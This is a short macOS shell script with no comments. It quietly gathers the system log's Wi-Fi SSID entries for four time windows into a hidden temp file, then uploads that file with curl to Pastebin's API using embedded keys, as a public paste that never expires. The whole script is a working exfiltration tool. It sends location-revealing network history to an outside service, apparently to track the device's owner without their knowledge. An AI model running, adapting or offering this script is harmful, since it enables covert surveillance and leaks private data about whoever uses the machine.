touch /tmp/.hist.txt
log show --predicate 'eventMessage contains " SSID "' --info --start "2024-08-20 09:00:00" --end "2024-08-20 09:15:00" >> /tmp/.hist.txt
log show --predicate 'eventMessage contains " SSID "' --info --start "2024-08-20 10:50:00" --end "2024-08-20 11:10:00" >> /tmp/.hist.txt
log show --predicate 'eventMessage contains " SSID "' --info --start "2024-08-20 12:45:00" --end "2024-08-20 13:00:00" >> /tmp/.hist.txt
log show --predicate 'eventMessage contains " SSID "' --info --start "2024-08-20 14:50:00" --end "2024-08-20 15:05:00" >> /tmp/.hist.txt

sleep 5

FILE_CONTENT=$(cat /tmp/.hist.txt)

curl -X POST -d 'api_dev_key=683c74cdc06c1d15c58c77ad7ee4aefb' \
     -d 'api_user_key=1172f321dc88ae2199b0d9f11cd22c18' \
     -d 'api_option=paste' \
     -d "api_paste_code=${FILE_CONTENT}" \
     -d 'api_paste_private=0' \
     -d 'api_paste_name=hist.txt' \
     -d 'api_paste_expire_date=N' \
     https://pastebin.com/api/api_post.php
